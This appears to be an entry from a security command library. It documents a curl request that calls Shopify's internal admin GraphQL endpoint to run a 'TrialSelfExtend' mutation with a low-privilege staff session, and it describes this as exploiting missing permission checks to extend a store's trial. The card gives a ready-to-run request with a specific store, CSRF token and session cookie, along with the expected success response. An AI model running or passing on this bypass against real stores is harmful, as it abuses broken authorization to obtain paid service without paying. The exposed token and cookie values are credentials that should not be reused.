---
id: cmd-shopify-trial-extend-post
data: >-
  curl -X POST https://store.myshopify.com/admin/internal/web/graphql/core -H
  "Content-Type: application/json" -H "X-CSRF-Token: <csrf_token>" -H "Cookie:
  <staff_session_cookies>" -d
  '{"operationName":"TrialSelfExtend","variables":{},"query":"mutation
  TrialSelfExtend { trialSelfExtend { message userErrors { field message
  __typename } __typename } }"}'
tags:
  - graphql
  - mutation
  - bypass
type: command
output: >-
  {"data":{"trialSelfExtend":{"message":"14 days extension added to your trial
  period","userErrors":[]}}}
executor: bash
platforms:
  - Web
  - Shopify
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:26.780Z'
verified: false
validated: true
submitted: true
---
# trial-self-extend-graphql

## Command

```bash
curl -X POST https://store.myshopify.com/admin/internal/web/graphql/core \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: <csrf_token>" \
  -H "Cookie: <staff_session_cookies>" \
  -d '{"operationName":"TrialSelfExtend","variables":{},"query":"mutation TrialSelfExtend { trialSelfExtend { message userErrors { field message __typename } __typename } }"}'
```

## Description

This curl command sends a POST request to Shopify's internal GraphQL endpoint to execute the TrialSelfExtend mutation using a low-privilege staff session, exploiting missing permission checks to extend the trial period. Use when testing access controls in Shopify admin APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://store.myshopify.com/admin/internal/web/graphql/core` | Target GraphQL endpoint (replace store with actual domain) | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "X-CSRF-Token: <csrf_token>"` | Anti-CSRF token from session | Yes |
| `-H "Cookie: <staff_session_cookies>"` | Staff session cookies for authentication | Yes |
| `-d '...' ` | JSON payload with mutation query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://risinghunter.myshopify.com/admin/internal/web/graphql/core \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: H9hN7Wt7-0Q1PwBhOsOIZMpEcCnp0WZQw8BM" \
  -H "Cookie: _secure_admin_session_id=9b14248b770db62cc190e3e264362b12; ..." \
  -d '{"operationName":"TrialSelfExtend","variables":{},"query":"mutation TrialSelfExtend { trialSelfExtend { message userErrors { field message __typename } __typename } }"}'
```

### Advanced Usage

Add verbose output with `-v` flag for debugging headers and responses:

```bash
curl -v -X POST https://store.myshopify.com/admin/internal/web/graphql/core \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: <token>" \
  -H "Cookie: <cookies>" \
  -d '{...}'
```

## Expected Output

Successful response: JSON with data.trialSelfExtend.message = "14 days extension added to your trial period" and empty userErrors array. Failure would show authorization errors or userErrors with permission messages.

## Related

- [[Related Procedure|procedures/Execute-TrialSelfExtend-GraphQL-Mutation]]
